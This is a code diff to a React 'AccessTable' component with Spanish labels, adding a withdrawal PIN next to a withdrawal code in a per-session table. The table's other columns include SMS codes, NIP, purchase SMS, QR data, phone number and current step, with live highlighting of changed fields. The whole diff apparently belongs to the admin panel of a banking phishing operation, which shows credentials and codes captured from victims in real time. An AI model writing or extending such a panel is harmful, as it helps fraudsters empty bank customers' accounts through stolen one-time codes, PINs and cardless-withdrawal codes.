@@ -472,6 +472,11 @@ const AccessTable: React.FC<AccessTableProps> = ({
                         <Ban className="h-4 w-4 text-[#888]" />
                         <div className={`text-sm ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                           Código Retiro: {session.codigoRetiro}
+                          {session.pinRetiro && (
+                            <span className={`ml-2 px-2 py-0.5 bg-[#2c2c2c] rounded ${highlightedFields[session.sessionId]?.pinRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                              PIN: {session.pinRetiro}
+                            </span>
+                          )}
                         </div>
                       </div>
                     )}
@@ -580,7 +585,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left w-[80px]">SMS</th>
                 <th className="p-3 text-left w-[80px]">NIP</th>
                 <th className="p-3 text-left w-[100px]">SMS COMPRA</th>
-                <th className="p-3 text-left w-[100px]">Código Retiro</th>
+                <th className="p-3 text-left w-[130px]">Código Retiro + PIN</th>
                 <th className="p-3 text-left w-[100px]">QR</th>
                 <th className="p-3 text-left w-[80px]">Celular</th>
                 <th className="p-3 text-left w-[100px]">Paso actual</th>
@@ -638,6 +643,11 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.codigoRetiro || '--'}
+                    {session.pinRetiro && (
+                      <div className="text-xs mt-1 px-2 py-0.5 bg-[#2c2c2c] rounded inline-block">
+                        PIN: {session.pinRetiro}
+                      </div>
+                    )}
                   </td>
                   <td className="p-3 text-[#ccc]">
                     {session.qrData ? (
